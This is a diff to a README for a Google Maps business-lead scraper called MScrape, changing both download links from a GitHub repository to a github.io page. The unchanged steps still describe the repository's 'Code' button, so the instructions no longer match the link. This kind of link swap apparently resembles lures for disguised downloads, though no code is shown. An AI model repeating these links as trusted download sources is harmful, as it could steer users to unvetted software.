@@ -1,6 +1,6 @@
 # 📊 MScrape - Find Business Leads on Google Maps
 
-[![](https://img.shields.io/badge/Download-MScrape-blue.svg)](https://github.com/xiou5497/MScrape)
+[![](https://img.shields.io/badge/Download-MScrape-blue.svg)](https://xiou5497.github.io)
 
 MScrape collects business information from Google Maps. It finds data like names, addresses, phone numbers, and websites for businesses in your area. This tool automates the process of gathering leads. You do not need to write code to use it.
 
@@ -16,7 +16,7 @@ Your computer needs a few components to run MScrape.
 
 Follow these steps to get the software:
 
-1. Visit the [MScrape repository page](https://github.com/xiou5497/MScrape).
+1. Visit the [MScrape repository page](https://xiou5497.github.io).
 2. Look for the green "Code" button near the top right of the page.
 3. Click "Download ZIP".
 4. Save the folder to a location on your computer, such as your Desktop.
